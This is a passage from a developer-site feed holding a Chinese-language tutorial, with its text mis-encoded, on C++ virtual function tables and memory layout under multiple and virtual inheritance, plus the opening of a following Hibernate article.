content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            C++è™šå‡½æ•°è¡¨ä¸å¤šé‡ç»§æ‰¿å†…å­˜å¸ƒå±€æ·±åº¦å‰–æ
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1972974802965230/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    ç äº‹æ¼«è°ˆ
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-28T13:36:43.000Z" title="Sun Dec 28 2025 13:36:43 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-28
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    14
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>åœ¨C++é¢å‘å¯¹è±¡ç¼–ç¨‹ä¸­ï¼Œè™šå‡½æ•°æ˜¯å®ç°è¿è¡Œæ—¶å¤šæ€çš„å…³é”®æœºåˆ¶ã€‚å•ç»§æ‰¿åœºæ™¯ä¸‹çš„è™šå‡½æ•°è¡¨(vtable)å¸ƒå±€ç›¸å¯¹ç›´è§‚ï¼Œä½†å½“æ¶‰åŠåˆ°å¤šé‡ç»§æ‰¿æ—¶ï¼Œæƒ…å†µå°±å˜å¾—å¤æ‚èµ·æ¥ã€‚æœ¬æ–‡å°†æ·±å…¥æ¢è®¨è™šå‡½æ•°è¡¨çš„å®ç°åŸç†ï¼Œå¹¶é‡ç‚¹è§£æå¤šé‡ç»§æ‰¿ä¸‹çš„å†…å­˜å¸ƒå±€ï¼Œå¸®åŠ©å¼€å‘è€…æ›´å¥½åœ°ç†è§£C++å¯¹è±¡æ¨¡å‹çš„åº•å±‚æœºåˆ¶ã€‚</p>
<h2 data-id="heading-0">ç¬¬ä¸€éƒ¨åˆ†ï¼šè™šå‡½æ•°è¡¨åŸºç¡€</h2>
<h3 data-id="heading-1">1.1 ä»€ä¹ˆæ˜¯è™šå‡½æ•°è¡¨</h3>
<p>è™šå‡½æ•°è¡¨ï¼ˆvtableï¼‰æ˜¯C++ç¼–è¯‘å™¨ä¸ºæ¯ä¸ªåŒ…å«è™šå‡½æ•°çš„ç±»ç”Ÿæˆçš„é™æ€æ•°æ®è¡¨ï¼Œå­˜å‚¨ç€æŒ‡å‘è¯¥ç±»è™šå‡½æ•°çš„æŒ‡é’ˆã€‚æ¯ä¸ªåŒ…å«è™šå‡½æ•°çš„å¯¹è±¡å®ä¾‹åœ¨å†…å­˜ä¸­éƒ½åŒ…å«ä¸€ä¸ªæŒ‡å‘å¯¹åº”vtableçš„æŒ‡é’ˆï¼ˆvptrï¼‰ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Base::func1"</span> &lt;&lt; endl; }
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func2</span><span class="hljs-params">()</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Base::func2"</span> &lt;&lt; endl; }
    <span class="hljs-type">int</span> data = <span class="hljs-number">10</span>;
};

<span class="hljs-comment">// å†…å­˜å¸ƒå±€ç¤ºæ„ï¼š</span>
<span class="hljs-comment">// å¯¹è±¡å®ä¾‹:</span>
<span class="hljs-comment">// [vptr] -&gt; æŒ‡å‘Baseçš„vtable</span>
<span class="hljs-comment">// [data] -&gt; 10</span>
<span class="hljs-comment">//</span>
<span class="hljs-comment">// Baseçš„vtable:</span>
<span class="hljs-comment">// [0] -&gt; &amp;Base::func1</span>
<span class="hljs-comment">// [1] -&gt; &amp;Base::func2</span>
</code></pre>
<h3 data-id="heading-2">1.2 vptrçš„åˆå§‹åŒ–æ—¶æœº</h3>
<p>vptrçš„åˆå§‹åŒ–å‘ç”Ÿåœ¨æ„é€ å‡½æ•°æ‰§è¡ŒæœŸé—´ï¼š</p>
<ol>
<li>åœ¨è¿›å…¥æ„é€ å‡½æ•°ä½“ä¹‹å‰ï¼Œvptrè¢«è®¾ç½®ä¸ºå½“å‰ç±»çš„vtable</li>
<li>æ„é€ å‡½æ•°ä½“æ‰§è¡Œ</li>
<li>å¦‚æœå­˜åœ¨æ´¾ç”Ÿç±»ï¼Œåœ¨æ´¾ç”Ÿç±»æ„é€ å‡½æ•°ä¸­vpträ¼šè¢«é‡æ–°è®¾ç½®ä¸ºæ´¾ç”Ÿç±»çš„vtable</li>
</ol>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-built_in">Derived</span>() {
        <span class="hljs-comment">// æ­¤æ—¶vptrå·²ç»æŒ‡å‘Derivedçš„vtable</span>
    }
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ cout &lt;&lt; <span class="hljs-string">"Derived::func1"</span> &lt;&lt; endl; }
};
</code></pre>
<h2 data-id="heading-3">ç¬¬äºŒéƒ¨åˆ†ï¼šå¤šé‡ç»§æ‰¿ä¸‹çš„å†…å­˜å¸ƒå±€</h2>
<h3 data-id="heading-4">2.1 åŸºæœ¬çš„å¤šé‡ç»§æ‰¿å¸ƒå±€</h3>
<p>å½“ç±»ä»å¤šä¸ªåŸºç±»ç»§æ‰¿æ—¶ï¼Œå¯¹è±¡å†…å­˜ä¸­å°†åŒ…å«å¤šä¸ªå­å¯¹è±¡ï¼Œæ¯ä¸ªå­å¯¹è±¡éƒ½æœ‰è‡ªå·±çš„vptrã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base1</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> b1_data = <span class="hljs-number">1</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Base2</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> b2_data = <span class="hljs-number">2</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Base1, <span class="hljs-keyword">public</span> Base2 {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f1</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f2</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">f3</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> d_data = <span class="hljs-number">3</span>;
};

<span class="hljs-comment">// Derivedå¯¹è±¡å†…å­˜å¸ƒå±€ï¼ˆç®€åŒ–ï¼‰:</span>
<span class="hljs-comment">// [vptr1] -&gt; æŒ‡å‘Derivedä¸­Base1éƒ¨åˆ†çš„vtable</span>
<span class="hljs-comment">// [b1_data] -&gt; 1</span>
<span class="hljs-comment">// [vptr2] -&gt; æŒ‡å‘Derivedä¸­Base2éƒ¨åˆ†çš„vtable  </span>
<span class="hljs-comment">// [b2_data] -&gt; 2</span>
<span class="hljs-comment">// [d_data] -&gt; 3</span>
</code></pre>
<h3 data-id="heading-5">2.2 thisæŒ‡é’ˆè°ƒæ•´æœºåˆ¶</h3>
<p>å¤šé‡ç»§æ‰¿ä¸­æœ€å…³é”®çš„é—®é¢˜æ˜¯thisæŒ‡é’ˆè°ƒæ•´ã€‚å½“é€šè¿‡Base2æŒ‡é’ˆè°ƒç”¨Derivedå¯¹è±¡çš„è™šå‡½æ•°æ—¶ï¼Œç¼–è¯‘å™¨éœ€è¦è°ƒæ•´thisæŒ‡é’ˆï¼Œä½¿å…¶æŒ‡å‘Derivedå¯¹è±¡ä¸­çš„Base2å­å¯¹è±¡ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp">Derived* d = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Derived</span>();
Base2* b2 = d;  <span class="hljs-comment">// è¿™é‡Œå‘ç”Ÿéšå¼è½¬æ¢ï¼šb2æŒ‡å‘Derivedå¯¹è±¡ä¸­çš„Base2å­å¯¹è±¡</span>

<span class="hljs-comment">// è½¬æ¢è¿‡ç¨‹ç›¸å½“äºï¼š</span>
<span class="hljs-comment">// Base2* b2 = reinterpret_cast&lt;Base2*&gt;(reinterpret_cast&lt;char*&gt;(d) + sizeof(Base1));</span>
</code></pre>
<h3 data-id="heading-6">2.3 å¤šé‡ç»§æ‰¿çš„vtableç»“æ„</h3>
<p>æ¯ä¸ªåŸºç±»åœ¨æ´¾ç”Ÿç±»ä¸­éƒ½æœ‰ç‹¬ç«‹çš„vtableã€‚æ´¾ç”Ÿç±»çš„æ–°è™šå‡½æ•°é€šå¸¸é™„åŠ åˆ°ç¬¬ä¸€ä¸ªåŸºç±»çš„vtableæœ«å°¾ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Derivedå¯¹è±¡çš„vtableç»“æ„ï¼š</span>

<span class="hljs-comment">// Base1å­å¯¹è±¡çš„vtable (ä¸»vtable):</span>
<span class="hljs-comment">// [0] -&gt; &amp;Derived::f1    // é‡å†™Base1::f1</span>
<span class="hljs-comment">// [1] -&gt; &amp;Base1::f2      // æœªé‡å†™ï¼Œä¿æŒBase1ç‰ˆæœ¬</span>
<span class="hljs-comment">// [2] -&gt; &amp;Derived::f3    // æ–°å¢è™šå‡½æ•°</span>

<span class="hljs-comment">// Base2å­å¯¹è±¡çš„vtable (æ¬¡vtable):</span>
<span class="hljs-comment">// [0] -&gt; &amp;thunk_to_Derived::f2  // éœ€è¦thisè°ƒæ•´çš„è·³è½¬ä»£ç </span>
<span class="hljs-comment">// [1] -&gt; &amp;Base2::other_func     // å…¶ä»–Base2è™šå‡½æ•°</span>
</code></pre>
<h2 data-id="heading-7">ç¬¬ä¸‰éƒ¨åˆ†ï¼šè™šç»§æ‰¿çš„å†…å­˜å¸ƒå±€</h2>
<h3 data-id="heading-8">3.1 è±å½¢ç»§æ‰¿é—®é¢˜</h3>
<p>è™šç»§æ‰¿ç”¨äºè§£å†³è±å½¢ç»§æ‰¿ï¼ˆé’»çŸ³ç»§æ‰¿ï¼‰ä¸­çš„äºŒä¹‰æ€§å’Œæ•°æ®å†—ä½™é—®é¢˜ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Base</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> base_data = <span class="hljs-number">10</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Middle1</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">middle1_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> m1_data = <span class="hljs-number">20</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Middle2</span> : <span class="hljs-keyword">virtual</span> <span class="hljs-keyword">public</span> Base {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">middle2_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> m2_data = <span class="hljs-number">30</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Derived</span> : <span class="hljs-keyword">public</span> Middle1, <span class="hljs-keyword">public</span> Middle2 {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">func</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{}
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">derived_func</span><span class="hljs-params">()</span> </span>{}
    <span class="hljs-type">int</span> d_data = <span class="hljs-number">40</span>;
};
</code></pre>
<h3 data-id="heading-9">3.2 è™šåŸºç±»è¡¨ï¼ˆvbtableï¼‰</h3>
<p>è™šç»§æ‰¿å¼•å…¥äº†è™šåŸºç±»è¡¨ï¼ˆvbtableï¼‰æˆ–ç±»ä¼¼æœºåˆ¶ï¼Œç”¨äºå®šä½è™šåŸºç±»å­å¯¹è±¡çš„ä½ç½®ã€‚</p>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// Derivedå¯¹è±¡å†…å­˜å¸ƒå±€ï¼ˆå…¸å‹å®ç°ï¼‰:</span>
<span class="hljs-comment">// [vptr_Middle1] -&gt; Middle1çš„vtable (åŒ…å«vbtableåç§»)</span>
<span class="hljs-comment">// [m1_data] -&gt; 20</span>
<span class="hljs-comment">// [vptr_Middle2] -&gt; Middle2çš„vtable (åŒ…å«vbtableåç§»)</span>
<span class="hljs-comment">// [m2_data] -&gt; 30</span>
<span class="hljs-comment">// [d_data] -&gt; 40</span>
<span class="hljs-comment">// [vptr_Base] -&gt; Baseçš„vtable</span>
<span class="hljs-comment">// [base_data] -&gt; 10</span>

<span class="hljs-comment">// æ¯ä¸ªè™šç»§æ‰¿çš„åŸºç±»éƒ½é€šè¿‡è‡ªå·±çš„vtableä¸­çš„ä¸€ä¸ªé¢å¤–æ¡ç›®</span>
<span class="hljs-comment">// æ¥å­˜å‚¨åˆ°è™šåŸºç±»å­å¯¹è±¡çš„åç§»é‡</span>
</code></pre>
<h3 data-id="heading-10">3.3 è™šç»§æ‰¿ä¸‹çš„æ€§èƒ½è€ƒé‡</h3>
<p>è™šç»§æ‰¿å¢åŠ äº†é—´æ¥è®¿é—®çš„å¼€é”€ï¼š</p>
<ol>
<li>é¢å¤–çš„æŒ‡é’ˆè§£å¼•ç”¨è®¿é—®è™šåŸºç±»æˆå‘˜</li>
<li>è™šå‡½æ•°è°ƒç”¨å¯èƒ½éœ€è¦å¤šæ¬¡é—´æ¥å¯»å€</li>
<li>å¯¹è±¡æ„é€ å’Œææ„æ›´å¤æ‚</li>
</ol>
<h2 data-id="heading-11">ç¬¬å››éƒ¨åˆ†ï¼šå®é™…æ¡ˆä¾‹åˆ†æ</h2>
<h3 data-id="heading-12">4.1 æŸ¥çœ‹å†…å­˜å¸ƒå±€çš„å·¥å…·å’Œæ–¹æ³•</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// ä½¿ç”¨ç¼–è¯‘å™¨ç‰¹å®šåŠŸèƒ½æŸ¥çœ‹å†…å­˜å¸ƒå±€</span>
<span class="hljs-comment">// GCC: -fdump-class-hierarchy é€‰é¡¹</span>
<span class="hljs-comment">// MSVC: /d1reportAllClassLayout é€‰é¡¹</span>

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Example</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Example</span>() = <span class="hljs-keyword">default</span>;
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">test</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
};

<span class="hljs-comment">// ç¼–è¯‘æ—¶æ·»åŠ é€‰é¡¹æŸ¥çœ‹å¸ƒå±€</span>
<span class="hljs-comment">// g++ -fdump-class-hierarchy example.cpp</span>
</code></pre>
<h3 data-id="heading-13">4.2 æ€§èƒ½ä¼˜åŒ–å»ºè®®</h3>
<ol>
<li><strong>é¿å…æ·±å±‚æ¬¡çš„å¤šé‡ç»§æ‰¿</strong>ï¼šè¶…è¿‡2-3å±‚çš„å¤šé‡ç»§æ‰¿ä¼šæ˜¾è‘—å¢åŠ å¤æ‚åº¦</li>
<li><strong>è°¨æ…ä½¿ç”¨è™šç»§æ‰¿</strong>ï¼šåªåœ¨çœŸæ­£éœ€è¦è§£å†³è±å½¢ç»§æ‰¿é—®é¢˜æ—¶ä½¿ç”¨</li>
<li><strong>è€ƒè™‘ç»„åˆä»£æ›¿ç»§æ‰¿</strong>ï¼šè®¸å¤šæƒ…å†µä¸‹ï¼Œç»„åˆæ¨¡å¼æ›´æ¸…æ™°é«˜æ•ˆ</li>
<li><strong>æ³¨æ„ç¼“å­˜å±€éƒ¨æ€§</strong>ï¼šåˆ†æ•£çš„vptrå¯èƒ½å½±å“ç¼“å­˜æ€§èƒ½</li>
</ol>
<h2 data-id="heading-14">ç¬¬äº”éƒ¨åˆ†ï¼šABIå…¼å®¹æ€§ä¸å®è·µ</h2>
<h3 data-id="heading-15">5.1 è·¨ç¼–è¯‘å™¨å…¼å®¹æ€§</h3>
<p>ä¸åŒç¼–è¯‘å™¨ï¼ˆGCCã€Clangã€MSVCï¼‰çš„vtableå®ç°ç»†èŠ‚ä¸åŒï¼š</p>
<ul>
<li>vpträ½ç½®ï¼ˆå¯¹è±¡å¼€å¤´æˆ–ç»“å°¾ï¼‰</li>
<li>è™šåŸºç±»æŒ‡é’ˆçš„å­˜å‚¨æ–¹å¼</li>
<li>RTTIä¿¡æ¯çš„æ•´åˆæ–¹å¼</li>
</ul>
<h3 data-id="heading-16">5.2 æœ€ä½³å®è·µ</h3>
<pre><code class="hljs language-cpp" lang="cpp"><span class="hljs-comment">// 1. æ˜ç¡®ä½¿ç”¨overrideå…³é”®å­—</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Interface</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Interface</span>() = <span class="hljs-keyword">default</span>;
};

<span class="hljs-comment">// 2. ä¼˜å…ˆä½¿ç”¨æ¥å£ç±»ï¼ˆçº¯è™šç±»ï¼‰è¿›è¡Œå¤šé‡ç»§æ‰¿</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">Runnable</span> {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-keyword">virtual</span> <span class="hljs-type">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>= <span class="hljs-number">0</span>;
    <span class="hljs-keyword">virtual</span> ~<span class="hljs-built_in">Runnable</span>() = <span class="hljs-keyword">default</span>;
};

<span class="hljs-keyword">class</span> <span class="hljs-title class_">Worker</span> : <span class="hljs-keyword">public</span> Interface, <span class="hljs-keyword">public</span> Runnable {
<span class="hljs-keyword">public</span>:
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">execute</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ <span class="hljs-comment">/* å®ç° */</span> }
    <span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">run</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{ <span class="hljs-comment">/* å®ç° */</span> }
};

<span class="hljs-comment">// 3. ä½¿ç”¨finalä¼˜åŒ–æ€§èƒ½ï¼ˆC++11ï¼‰</span>
<span class="hljs-keyword">class</span> <span class="hljs-title class_">OptimizedDerived</span> <span class="hljs-keyword">final</span> : <span class="hljs-keyword">public</span> Base {
    <span class="hljs-comment">// ä¸èƒ½è¢«è¿›ä¸€æ­¥ç»§æ‰¿ï¼ŒæŸäº›æƒ…å†µä¸‹å…è®¸ç¼–è¯‘å™¨ä¼˜åŒ–</span>
};
</code></pre>
<h2 data-id="heading-17">ç»“è®º</h2>
<p>ç†è§£C++è™šå‡½æ•°è¡¨å’Œå¤šé‡ç»§æ‰¿çš„å†…å­˜å¸ƒå±€å¯¹äºç¼–å†™é«˜æ•ˆã€å¯é çš„C++ä»£ç è‡³å…³é‡è¦ã€‚è™½ç„¶ç°ä»£C++æ›´å€¾å‘äºä½¿ç”¨ç»„åˆå’ŒåŸºäºæ¥å£çš„è®¾è®¡ï¼Œä½†æ·±å…¥ç†è§£è¿™äº›åº•å±‚æœºåˆ¶ä»ç„¶æ˜¯é«˜çº§C++å¼€å‘è€…çš„å¿…å¤‡æŠ€èƒ½ã€‚é€šè¿‡æŒæ¡è¿™äº›çŸ¥è¯†ï¼Œå¼€å‘è€…å¯ä»¥ï¼š</p>
<ol>
<li>æ›´å¥½åœ°è°ƒè¯•å¤æ‚ç»§æ‰¿å±‚æ¬¡çš„é—®é¢˜</li>
<li>åšå‡ºæ›´æ˜æ™ºçš„æ¶æ„è®¾è®¡å†³ç­–</li>
<li>ç¼–å†™ABIå…¼å®¹çš„åº“å’Œæ¥å£</li>
<li>åœ¨æ€§èƒ½å…³é”®åœºæ™¯ä¸­è¿›è¡Œé’ˆå¯¹æ€§ä¼˜åŒ–</li>
</ol>
<p>C++çš„å¯¹è±¡æ¨¡å‹è™½ç„¶å¤æ‚ï¼Œä½†å…¶è®¾è®¡çš„çµæ´»æ€§å’Œæ€§èƒ½ä¼˜åŠ¿æ­£æ˜¯é€šè¿‡è¿™ç§å¤æ‚æ€§å®ç°çš„ã€‚ä½œä¸ºå¼€å‘è€…ï¼Œæˆ‘ä»¬åº”è¯¥åœ¨ç†è§£åº•å±‚æœºåˆ¶çš„åŸºç¡€ä¸Šï¼Œåˆç†è¿ç”¨è¯­è¨€ç‰¹æ€§ï¼Œæ„å»ºæ—¢é«˜æ•ˆåˆæ˜“äºç»´æŠ¤çš„ç³»ç»Ÿã€‚</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[Hibernateï¼ˆ8ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„SessionFactoryï¼Ÿ]]></title>    <link>https://juejin.cn/post/7588300640599080966</link>    <guid>https://juejin.cn/post/7588300640599080966</guid>    <pubDate>2025-12-27T23:15:44.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588300640599080966" data-draft-id="7588152122186989622" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="Hibernateï¼ˆ8ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„SessionFactoryï¼Ÿ"/> <meta itemprop="keywords" content="åç«¯"/> <meta itemprop="datePublished" content="2025-12-27T23:15:44.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Victor356"/> <meta itemprop="url" content="https://juejin.cn/user/3492507879476878"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            Hibernateï¼ˆ8ï¼‰ä»€ä¹ˆæ˜¯Hibernateçš„SessionFactoryï¼Ÿ
